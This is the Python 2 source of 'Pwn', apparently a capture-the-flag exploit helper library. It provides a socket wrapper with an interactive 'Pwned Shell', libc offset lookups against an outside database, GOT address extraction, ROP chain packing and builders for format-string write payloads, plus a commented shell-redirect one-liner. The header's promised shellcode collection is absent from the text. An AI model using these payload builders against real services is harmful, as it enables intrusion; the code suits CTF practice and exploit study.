#!/usr/bin/python

# - This is Pwn module that helps you to build faster and easier payloads.
# - Pwn module works like a Interface (Abstract Class) that create a templet
# that you can base on it and create your payload.
# - Pwn module also support you create format string exploit easily, support x86 and x86-64
# - This module includes collection of shellcode, you can easily use it for your
# payload, supports Linux x86 and x86-64, arm will support later.
# - To install this module, you just copy this module to /usr/lib/python2.7 or python 3.1

# On this version 0.3 , i will add new feature
# method that help calc offset between 2 libc function (system and other func)
# method that help automatic find got address and write value to it

# Requires: pyelftools

# Author : Peternguyen
# Version : 0.3.2

# /bin/sh -c "echo shell >&4; sh <&4 >&4"

from ctypes import *
from struct import *
from elftools.common.py3compat import bytes2str
from elftools.elf.elffile import ELFFile
from elftools.elf.relocation import RelocationSection
from elftools.elf.sections import SymbolTableSection
import telnetlib
import os
import json
import urllib2
import urllib
import random
import string

LIBC_REPO = 'http://libc.babyphd.net/' # own libc repo

class Telnet(telnetlib.Telnet):
	def __init__(self,host,port):
		telnetlib.Telnet.__init__(self,host,port)
	# make easier when you want to send raw data to server
	def send(self,data):
		return self.get_socket().send(data)

	def recv(self,size):
		return self.get_socket().recv(size)

class Pwn():
	def __init__(self,**kwargs):
		# setting default values
		self.mode = 0 # for x86 mode is default mode
		self.host = 'localhost'
		self.port = 8888
		self.con = None
		self.pfile = None
		self.sock_file = None

		# user inputs values
		for key,value in kwargs.iteritems():
			# setting some instances
			if key.lower() == 'mode':
				if type(value) is int:
					self.mode = value
				else:
					raise Exception('Unexpected value of self.mode')
			elif key.lower() == 'host':
				if type(value) is str:
					self.host = value
				else:
					raise Exception('Unexpected value of self.host')
			elif key.lower() == 'port':
				if type(value) is int:
					self.port = value
				else:
					raise Exception('Unexpected value of self.port')
			elif key.lower() == 'pfile':
				if type(value) is str:
					if os.path.exists(value):
						self.pfile = open(value,'r')
					else:
						raise Exception('File %s not found' % value)

	def connect(self):
		if not self.con:
			self.con = Telnet(self.host,self.port)
		else:
			raise Exception('You had connected.')

	# make socket as file, use with libncurse in service
	def makefile(self,mode,bufsize=0): # default bufsize = 0 unbuffered
		if not self.con:
			raise Exception('You must connect() first')
		s = self.con.get_socket()
		self.sock_file = s.makefile(mode,bufsize)
		return self.sock_file

	# some function work with sock_file
	def read_file_until(self,end):
		buf = ''
		if not self.sock_file:
			raise Exception('You must makefile() first')

		while not buf.endswith(end):
			buf += self.sock_file.read(1)
		return buf

	# wrapper popular send/recive function
	def read_until(self,value):
		if self.con:
			return self.con.read_until(value)
		else:
			raise Exception('You must connect() first')

	def read_all(self):
		rc = self.con.recv(1024)
		while 1:
			t = self.con.recv(1024)
			if t == '':
				break
			rc += t
		return rc 

	def write(self,value):
		if self.con:
			return self.con.write(value)
		else:
			raise Exception('You must connect() first')

	def send(self,value):
		if self.con:
			return self.con.send(value)
		else:
			raise Exception('You must connect() first')

	def recv(self,size):
		if self.con:
			return self.con.recv(size)
		else:
			raise Exception('You must connect() first')

	def close(self):
		if self.con:
			self.con.close()
		else:
			raise Exception('You must connect() first')

	def io(self):
		print '[+] Pwned Shell.'
		self.con.interact()

	# get base libc address from leak address.
	# >>> from Pwn import *
	# >>> p = Pwn()
	# >>> p.get_libc_base_addr('puts',0x7ffff7a84e30)
	# 140737347932160
	def get_libc_base_addr(self,func_name,func_addr):
		offset = 0
		try:
			form = { # own post request
				'leak_addr' : hex(func_addr),
				'func_name' : func_name,
			}
			headers = {'User-Agent':'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'}
			req = urllib2.Request(LIBC_REPO + 'get_libc_base_addr',urllib.urlencode(form),headers) # getting result
			res = urllib2.urlopen(req)
			result = json.loads(res.read())
			res.close()

			offset = result['libc_base_addr']
		except: # handle every exception
			pass
		return offset

	# get offset between to function if you can leak one of them
	# >>> from Pwn import *
	# >>> p = Pwn()
	# >>> offset = p.get_libc_offset(0x7ffff7a84e30,'puts')
	# >>> print hex(offset)
	# 0x297f0
	def get_libc_offset(self,func2_addr,func2_name,func1_name='system'):
		# get offset on own collection
		offset = 0
		try:
			form = { # own post request
				'func_addr' : hex(func2_addr),
				'func_name' : func2_name,
				'func2_name' : func1_name
			}
			headers = {'User-Agent':'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'}
			req = urllib2.Request(LIBC_REPO + 'libc_find',urllib.urlencode(form),headers) # getting result
			res = urllib2.urlopen(req)
			result = json.loads(res.read())
			res.close()

			offset = result['offset']
		except: # handle every exception
			pass
		return offset

	# get all possible offset by os_name os_version and arch
	# >>> loff = p.get_libc_offset_by('system','ubuntu','14.04','i386')
	# >>> print loff
	# [261328, 262544, 261904, 263088]
	def get_libc_offset_by(self,func_name,os_name,os_version,arch):
		offset = None
		try:
			form = { # own post request
				'func_name' : func_name,
				'os_name' : os_name,
				'os_version' : os_version,
				'arch' : arch
			}
			headers = {'User-Agent':'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'}
			# getting result
			req = urllib2.Request(LIBC_REPO + 'get_offset_by_os_name',urllib.urlencode(form),headers)
			res = urllib2.urlopen(req)
			result = json.loads(res.read())
			res.close()

			offset = result['offset']
		except: # handle every exception
			pass
		return offset

	# this method helps you calc local libc.so offset
	# >>> offset = p.calc_libc_offset('/lib/x86_64-linux-gnu/libc.so.6','puts')
	# >>> print hex(offset)
	# 0x297f0
	def calc_libc_offset(self,libc_path,func2,func1='system'):
		offset = 0
		if os.path.exists(libc_path):
			pfile = open(libc_path,'r')

			# can't find any thing calculate it
			elffile = ELFFile(pfile)

			# dump symbol table
			symbol_sec = elffile.get_section_by_name(b'.dynsym')
			# can dump ?
			if not isinstance(symbol_sec, SymbolTableSection):
				return None

			func1_addr = 0
			func2_addr = 0
			for symbol in symbol_sec.iter_symbols():
				if symbol.name == func1:
					func1_addr = symbol.entry['st_value'] # get offset of func1
				if symbol.name == func2:
					func2_addr = symbol.entry['st_value'] # get offset of func2
				# collect all neccessary function
				if func1_addr and func2_addr:
					break

			offset = func1_addr - func2_addr if func1_addr > func2_addr else func2_addr - func1_addr

			pfile.close()

		return offset

	# easy way to find got :v
	# >>> p = Pwn(pfile='pwn.elf')
	# >>> p.got('puts')
	# 0x60008
	def got(self,func_name):
		func_addr = 0

		if self.pfile:
			elffile = ELFFile(self.pfile)

			arch = elffile.get_machine_arch() # get arch

			# dump symbol table
			symbol_sec = elffile.get_section_by_name(b'.dynsym')
			# can dump ?
			if not isinstance(symbol_sec, SymbolTableSection):
				return None

			# get reallocation section to dump got table
			reladyn_name = b'.rel.plt' if arch == 'x86' else b'.rela.plt'
			reladyn = elffile.get_section_by_name(reladyn_name)
			# can dump ?
			if not isinstance(reladyn, RelocationSection):
				return None

			# find function address in got table
			for reloc in reladyn.iter_relocations():
				got_func_name = symbol_sec.get_symbol(reloc['r_info_sym']).name
				if got_func_name == func_name:
					func_addr = reloc['r_offset']
					break

		return func_addr # adding packing before return value

	# utilities method that support you make your payload easier
	def p32(self,value):
		return pack('<I',value)

	def up32(self,value):
		return unpack('<I',value)[0]

	def p64(self,value):
		return pack('<Q',value)

	def up64(self,value):
		return unpack('<Q',value)[0]

	# using pack,unpack simplier by defining mode value
	def pack(self,value):
		return self.p32(value) if self.mode == 0 else self.p64(value)

	def unpack(self,value):
		return self.up32(value) if self.mode == 0 else self.up64(value)

	def pA(self,ropchain):
		return ''.join([self.pack(rop) for rop in ropchain])

	# building format string payload support 32 and 64 bit :)
	# you can ovewrite this method and make it better
	def build32FormatStringBug(self,address,write_address,offset,pad = ''):
		fmt = pad
		for i in xrange(4):
			fmt += pack('<I',address + i)

		length_pad = len(fmt)
		start = 0
		if c_byte(write_address & 0xff).value < length_pad:
			start += 0x100

		# generate write string
		for i in xrange(0,4):
			byte = (write_address >> (8*i)) & 0xff
			byte += start
			fmt += '%{0}x'.format((byte - length_pad)) + '%{0}$n'.format(offset + i)
			length_pad = byte
			start += 0x100
		
		return fmt

	# this method require you must find a stable format string and offset that make stack offset doesn't change.
	def build64FormatStringBug(self,address,write_address,offset,pad = ''):
		fmt = ''
		next = 0
		last = len(fmt) # length pad
		for i in xrange(8):
			byte = (write_address >> (8*i)) & 0xff
			byte += next
			fmt+= '%{0}x%{1}$n'.format(byte - last,offset + i)
			last = byte
			next += 0x100
		# fmt+= 'A'*20 # you may custom here
		fmt+= pad # stable pad must be appended here
		for i in xrange(8):
			fmt+= self.p64(address + i)

		return fmt

	# dynamic buildFormatStringBug
	def genFormatString(self,address,write_address,offset,pad = ''):
		if self.mode: # for 64 bits mode
			return self.build64FormatStringBug(address,write_address,offset,pad)
		else: # for 32 bits mode
			return self.build32FormatStringBug(address,write_address,offset,pad)

	# randomize my buffer :v
	def rand_buf(self,size,except_bytes=['\x00','\x0a','\x0b','\x0c']):
		buf = ''
		for i in xrange(size):
			b = os.urandom(1)
			while b in except_bytes:
				b = os.urandom(1)
			buf += b
		return buf

	# random string,number
	def rand_string(self,N):
		return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N))

	#xxd hexdump function
	def xxd(self,stream):
		_str = ""
		i = 0
		for i,s in enumerate(list(stream)):
			if i%16 == 0:
				print "%07x:" % i,
			print "%02x" % ord(s),
			_str += s if( ord(s) in range(0x20,0x7f) ) else "."
			if (i+1)%8 == 0:
				print "",
			if (i+1)%16 == 0:
				print "|  %s" % _str
				_str = ""
		if (i+1)%16 != 0:
			print "   "*(16-((i%16)+1)),
			if (16-((i%16)+1)) > 8:
				print "",
			print "|  %s" % _str


	# deallocation object
	def __del__(self):
		if self.pfile:
			self.pfile.close()
